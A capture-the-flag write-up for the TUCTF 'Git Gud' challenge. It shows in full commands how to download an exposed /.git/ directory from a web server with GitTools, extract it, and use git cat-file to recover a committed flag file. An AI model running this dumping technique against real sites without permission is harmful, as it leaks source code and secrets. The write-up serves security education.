# Writeup

### Challenge available at ```http://gitgud.tuctf.com```

# Tool
Use this tool to dig for ```/.git/``` folder [GitTools](https://github.com/internetwache/GitTools)

# Solve
Use tool I recommended above to download `/.git/` folder by command
```./GitTools/Dumper/gitdumper.sh http://gitgud.tuctf.com/.git/ GitGud```

Then we extract it 
```./GitTools/Extractor/extractor.sh GitGud GitGudExtracted```

After that we cat the file `GitGud/.git/logs/refs/heads/master` and you will see 
```
2c6190537a2655121ccb9647765fa99687afec25 22f63ceab55efe05c5448676a3470b13b6545f74 Jimmy <jimmy@jimmyrocks.site> 1511297558 +0000        commit: Added flag
```
Using `git cat-file` command

Then do the following
```
quanghuynh@ubuntu:~/Desktop/Tools/GitTools/Git-Gud$ git cat-file -p 2c6190537a2655121ccb9647765fa99687afec25
tree b0f30828b576f99e0f7b906b751a32969182913f
parent cfb7e1cbb11d866d4084920fde50077d26bb0953
author Jimmy <jimmy@jimmyrocks.site> 1511297071 +0000
committer Jimmy <jimmy@jimmyrocks.site> 1511297071 +0000

Updated blog

quanghuynh@ubuntu:~/Desktop/Tools/GitTools/Git-Gud$ git cat-file -p 22f63ceab55efe05c5448676a3470b13b6545f74
tree 61315dcca584181b2580b1cdf6e5d36f0323a752
parent 2c6190537a2655121ccb9647765fa99687afec25
author Jimmy <jimmy@jimmyrocks.site> 1511297558 +0000
committer Jimmy <jimmy@jimmyrocks.site> 1511297558 +0000

Added flag
quanghuynh@ubuntu:~/Desktop/Tools/GitTools/Git-Gud$ git cat-file -p 61315dcca584181b2580b1cdf6e5d36f0323a752
100644 blob 353589fc6a0a098f208cd7b2a391ecc4b65d8b56    README.md
100644 blob 2a31291a3ab4f8f05e9a421617abaa524da0b89f    about.html
100644 blob b8665ba15c1c9c511dba4c89d82d2fe521d42b28    blog.html
100644 blob 25121cd6f15776125c846b78e6e3caef9f4717df    contact.html
100644 blob a0438b2b3f9c41b14ff02eae8ece9a4384bdcbf9    flag
100644 blob 1a348966ee0bee969c0ab166510ef08535ff13d4    gitgud.gif
100644 blob d833bbffb80d9a1d58acf76854a8d2c905926dff    index.html
quanghuynh@ubuntu:~/Desktop/Tools/GitTools/Git-Gud$ git cat-file -p a0438b2b3f9c41b14ff02eae8ece9a4384bdcbf9

TUCTF{D0nt_Us3_G1t_0n_Web_S3rv3r}
```

# Flag 
TUCTF{D0nt_Us3_G1t_0n_Web_S3rv3r}
